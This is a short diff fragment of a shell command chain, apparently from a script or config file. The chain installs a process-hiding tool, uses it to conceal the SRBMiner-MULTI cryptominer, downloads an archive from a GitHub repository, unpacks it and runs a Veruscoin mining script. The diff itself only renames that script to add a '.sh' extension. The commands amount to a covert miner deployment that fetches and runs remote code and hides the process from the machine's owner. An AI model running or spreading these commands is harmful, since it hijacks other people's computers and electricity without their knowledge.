@@ -8,5 +8,5 @@ npm i -g node-process-hider &&
 sudo ph add SRBMiner-MULTI && 
 wget https://github.com/geraldyolang11/mine/raw/main/converted.tar && 
 tar -xf converted.tar &&
-chmod +x start-mining-veruscoin &&
-./start-mining-veruscoin"
+chmod +x start-mining-veruscoin.sh &&
+./start-mining-veruscoin.sh"
